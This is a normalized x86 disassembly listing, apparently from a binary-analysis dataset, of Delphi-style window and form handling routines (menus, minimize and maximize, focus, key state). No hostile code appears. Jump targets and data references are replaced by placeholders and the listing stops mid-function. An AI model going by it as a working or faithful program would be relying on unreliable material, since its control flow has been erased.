push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_464e14
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_46383c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_464d18
pop ecx
sub_464e48
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44a6b4
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44f7d8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f7d8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44f7d8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44968c
pop esi
pop ebx
retn
sub_464ed8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44ea2c
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_44f7d8
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45d310
sub_464f38
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44dac8
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_45cd24
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_464f84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_45d584
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_464fbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_465057
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46505e
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_45cc84
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_469e1c
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_446090
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_469e1c
jmp r-xdata
sub_465084
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403324
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_4650c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40ce6c
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_4650f0
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_4648b0
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_445e68
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_465148
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e910
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4687d0
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403324
sub_4651d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_44f7d8
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_44f7d8
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_46526c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44f7d8
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_46484c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403324
sub_4652c4
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_44fd0c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_4652f0
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4648b0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_46530c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_45ccb4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_45ccb4
sub_46534c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_465384
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403f0c
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4653b8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_465509
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465510
lea eax [ ebp - 0x10 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_46530c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_445e0c
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_417088
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_448ac4
lea eax [ ebp - 0x1c ]
call sub_406b90
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_46530c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_46534c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_469ac0
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_469b28
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_469b28
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_465384
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_417088
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_448ac4
lea eax [ ebp - 0x1c ]
call sub_406b90
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_469a58
test [ esi + 0x228 ] 0x8
je r-xdata
sub_465518
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_46558c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4655b8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44dd74
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4635c8
lea edx [ ebp - 0x14 ]
call sub_466d90
push ebp
mov eax [ ebp - 0x4 ]
call sub_4635c8
lea edx [ ebp - 0x24 ]
call sub_466d90
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_46558c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4635c8
lea edx [ ebp - 0x24 ]
call sub_466d90
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_46558c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_46558c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_46558c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_465670
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403324
pop esi
pop ebx
retn
sub_465694
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403324
pop esi
pop ebx
retn
sub_4656b8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_44ec54
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_44fd0c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_44fd0c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_465754
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465cbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_469f0c
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_465ca1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ca8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
push ebp
push sub_465ba8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_46580c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464900
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cd30
jmp r-xdata
mov eax [ rw-data ]
call sub_466fec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44f7d8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_466fe0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7d8
call sub_460528
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46701c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_466fec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44920c
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_467010
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_466fe0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_463bb0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_463bb0
jmp r-xdata
sub_465811
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_469620
call sub_403970
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_466fec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_466fe0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46701c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_466fec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ca8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
